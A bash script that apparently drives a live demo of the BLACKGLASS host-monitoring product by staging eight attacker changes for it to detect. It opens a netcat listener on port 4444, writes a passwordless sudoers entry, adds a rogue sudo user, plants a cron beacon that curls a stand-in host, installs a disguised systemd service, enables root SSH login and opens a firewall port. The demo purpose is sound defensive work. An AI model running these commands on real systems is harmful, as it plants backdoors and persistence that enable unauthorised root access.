#!/bin/bash
# =============================================================
#  BLACKGLASS — Full Live Demo
#  Runs all 8 attack scenarios with pauses between each one.
#  Usage: bash /root/demo/full-demo.sh
# =============================================================

RED='\033[0;31m'
GRN='\033[0;32m'
YEL='\033[1;33m'
CYN='\033[0;36m'
BLD='\033[1m'
RST='\033[0m'

pause() {
  echo ""
  echo -e "${YEL}${BLD}>>> Switch to BLACKGLASS now and trigger a scan. Press ENTER when ready to continue...${RST}"
  read -r
}

banner() {
  echo ""
  echo -e "${CYN}============================================================${RST}"
  echo -e "${CYN}  $1${RST}"
  echo -e "${CYN}============================================================${RST}"
}

HOST_IP=$(hostname -I | awk '{print $1}')

echo -e "${BLD}"
echo "  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ ██╗      █████╗ ███████╗███████╗"
echo "  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝ ██║     ██╔══██╗██╔════╝██╔════╝"
echo "  ██████╔╝██║     ███████║██║     █████╔╝ ██║  ███╗██║     ███████║███████╗███████╗ "
echo "  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║   ██║██║     ██╔══██║╚════██║╚════██║"
echo "  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚██████╔╝███████╗██║  ██║███████║███████║"
echo "  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝"
echo -e "${RST}"
echo -e "${BLD}  Live Attack Simulation — Demo Host: $(hostname) (${HOST_IP})${RST}"
echo ""
echo -e "  ${GRN}BLACKGLASS console:${RST} https://blackglasssec.com/dashboard"
echo ""
echo -e "${YEL}  Make sure you have captured a clean baseline before starting.${RST}"
echo -e "${YEL}  Press ENTER to begin...${RST}"
read -r

# ── SCENE 1 ──────────────────────────────────────────────────
banner "SCENE 1 / 8 — Backdoor port listener  [LISTENERS]"
echo -e "  ${RED}Attack:${RST}  Attacker opens a reverse-shell listener on TCP 4444."
echo -e "  ${GRN}Detects:${RST} New entry in ss -tlnp not present in baseline."
echo ""
pkill -f 'ncat -lkp 4444' 2>/dev/null; true
ncat -lkp 4444 &
echo -e "  ${GRN}✓${RST} Port 4444 is now listening (PID $!)"
pause

# ── SCENE 2 ──────────────────────────────────────────────────
banner "SCENE 2 / 8 — Sudoers privilege escalation  [SUDOERS]"
echo -e "  ${RED}Attack:${RST}  Adds a NOPASSWD wildcard sudoers entry — any command as root."
echo -e "  ${GRN}Detects:${RST} New file in /etc/sudoers.d with unrestricted escalation."
echo ""
echo 'demo-user ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/demo-backdoor
chmod 440 /etc/sudoers.d/demo-backdoor
echo -e "  ${GRN}✓${RST} /etc/sudoers.d/demo-backdoor created"
pause

# ── SCENE 3 ──────────────────────────────────────────────────
banner "SCENE 3 / 8 — Rogue user account  [USERS]"
echo -e "  ${RED}Attack:${RST}  Creates a hidden user account 'attacker-ssh'."
echo -e "  ${GRN}Detects:${RST} New UID >= 1000 entry in /etc/passwd not in baseline."
echo ""
useradd -m -s /bin/bash attacker-ssh 2>/dev/null || true
echo -e "  ${GRN}✓${RST} User 'attacker-ssh' added ($(id attacker-ssh))"
pause

# ── SCENE 4 ──────────────────────────────────────────────────
banner "SCENE 4 / 8 — Sudo group membership  [SUDO GROUP]"
echo -e "  ${RED}Attack:${RST}  Grants 'attacker-ssh' full sudo access via group membership."
echo -e "  ${GRN}Detects:${RST} getent group sudo shows new member not in baseline."
echo ""
usermod -aG sudo attacker-ssh
echo -e "  ${GRN}✓${RST} 'attacker-ssh' added to sudo group"
getent group sudo
pause

# ── SCENE 5 ──────────────────────────────────────────────────
banner "SCENE 5 / 8 — Cron persistence  [CRON]"
echo -e "  ${RED}Attack:${RST}  Plants a beacon cron job to call home every 5 minutes."
echo -e "  ${GRN}Detects:${RST} New file in /etc/cron.d not present in baseline."
echo ""
cat > /etc/cron.d/demo-persistence << 'CRON'
# Attacker persistence — beacons home every 5 minutes
*/5 * * * * root curl -sf http://192.168.1.100/beacon?id=$(hostname) > /dev/null 2>&1
CRON
chmod 644 /etc/cron.d/demo-persistence
echo -e "  ${GRN}✓${RST} /etc/cron.d/demo-persistence created"
ls /etc/cron.d/
pause

# ── SCENE 6 ──────────────────────────────────────────────────
banner "SCENE 6 / 8 — Suspicious new service  [SERVICES]"
echo -e "  ${RED}Attack:${RST}  Installs a persistent systemd service disguised as telemetry."
echo -e "  ${GRN}Detects:${RST} New running service not present in baseline service list."
echo ""
cat > /etc/systemd/system/demo-beacon.service << 'UNIT'
[Unit]
Description=System Telemetry Collector
After=network.target
[Service]
ExecStart=/bin/bash -c 'while true; do sleep 300; done'
Restart=always
[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload
systemctl enable --now demo-beacon 2>/dev/null
echo -e "  ${GRN}✓${RST} demo-beacon.service is running"
systemctl status demo-beacon --no-pager | grep -E 'Active|Loaded'
pause

# ── SCENE 7 ──────────────────────────────────────────────────
banner "SCENE 7 / 8 — SSH hardening reverted  [SSH CONFIG]"
echo -e "  ${RED}Attack:${RST}  Re-enables root password login — CIS Benchmark Level 1 failure."
echo -e "  ${GRN}Detects:${RST} sshd -T output changed: permitrootlogin yes."
echo ""
sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
systemctl reload ssh
echo -e "  ${GRN}✓${RST} SSH config changed:"
grep 'PermitRootLogin' /etc/ssh/sshd_config
pause

# ── SCENE 8 ──────────────────────────────────────────────────
banner "SCENE 8 / 8 — Firewall rule added  [FIREWALL]"
echo -e "  ${RED}Attack:${RST}  Opens port 8080 inbound — exposes an internal service."
echo -e "  ${GRN}Detects:${RST} ufw status verbose shows new rule not in baseline."
echo ""
ufw allow 8080/tcp comment 'demo-hole'
echo -e "  ${GRN}✓${RST} Port 8080 now open in ufw"
ufw status | grep 8080
pause

# ── SUMMARY ──────────────────────────────────────────────────
echo ""
echo -e "${CYN}============================================================${RST}"
echo -e "${CYN}  DEMO COMPLETE — 8 attack scenarios shown${RST}"
echo -e "${CYN}============================================================${RST}"
echo ""
echo -e "  Surfaces triggered: Listeners · Sudoers · Users · Sudo group"
echo -e "                      Cron · Services · SSH config · Firewall"
echo ""
echo -e "  ${YEL}To reset the host:  bash /root/demo/reset.sh${RST}"
echo ""
